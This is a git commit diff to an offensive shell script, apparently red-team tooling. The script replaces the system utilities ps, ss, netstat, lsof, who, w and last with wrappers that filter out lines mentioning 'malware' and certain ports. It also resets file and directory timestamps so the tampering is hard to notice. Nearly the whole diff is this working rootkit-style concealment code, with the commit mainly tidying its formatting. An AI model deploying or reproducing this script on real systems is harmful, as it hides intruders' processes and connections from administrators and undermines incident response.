7f4556101da6b686953d32a0e9e45cca86f3349e
s-christian <61216427+s-christian@users.noreply.github.com>
2022-01-20 00:37:11 -0500

    local-replace_binaries: updated formatting, fixed one potential issue

--- Linux/offense/local-replace_binaries.sh
+++ Linux/offense/local-replace_binaries.sh
@@ -5,31 +5,34 @@ if [ $EUID -ne 0 ]; then
 	exit 1
 fi
 
-get_old_timestamp () {
+get_timestamp () {
 	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
 }
 
-text_to_hide="malware|4444|1337|1414|1415|1416|1417|5900|5901|5902|5903"
-old_bin_timestamp=$(get_old_timestamp /bin)
-old_sbin_timestamp=$(get_old_timestamp /sbin)
+PROCESSES="ps ss netstat lsof who w last"
+HIDDEN="malware|1337|1414|1415|1416|1417|5900|5901|5902|5903"
 
-processes="ps ss netstat lsof who w last"
-for process in $processes; do
-	if process_path=$(which $process); then
+bin_timestamp=`get_timestamp /bin`
+sbin_timestamp=`get_timestamp /sbin`
+
+for process in $PROCESSES; do
+	if `which $process`; then
+		process_path=`which $process`
+
 		if [ -f "/bin/bak${process}" ]; then
 			echo "[-] Binary '$process' has already been hijacked, skipping"
 		else
-			old_process_timestamp=$(get_old_timestamp $process_path)
-			if [ ! cp $process_path "/bin/bak${process}" ]; then
+			process_timestamp=`get_timestamp "$process_path"`
+			if [ ! cp "$process_path" "/bin/bak${process}" ]; then
 				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
 			else
-				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$text_to_hide\"" > $process_path ]; then
+				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDDEN\"" > "$process_path" ]; then
 					echo "[!] Could not write to '$process_path', restoring original binary..."
-					mv "/bin/bak${process}" $process_path
-					touch -t $old_process_timestamp $process_path
+					mv "/bin/bak${process}" "$process_path"
+					touch -t $process_timestamp "$process_path"
 				else
-					chmod 755 $process_path
-					touch -t $old_process_timestamp $process_path
+					chmod 755 "$process_path"
+					touch -t $process_timestamp "$process_path"
 					echo "[*] Hijacked binary '$process_path'"
 				fi
 			fi
@@ -39,8 +42,9 @@ for process in $processes; do
 	fi
 done
 
-touch -t $old_bin_timestamp /bin
-touch -t $old_sbin_timestamp /sbin
+touch -t $bin_timestamp "/bin"
+touch -t $sbin_timestamp "/sbin"
+
 echo
 echo "[+] Restored '/bin' and '/sbin' timestamps"
 
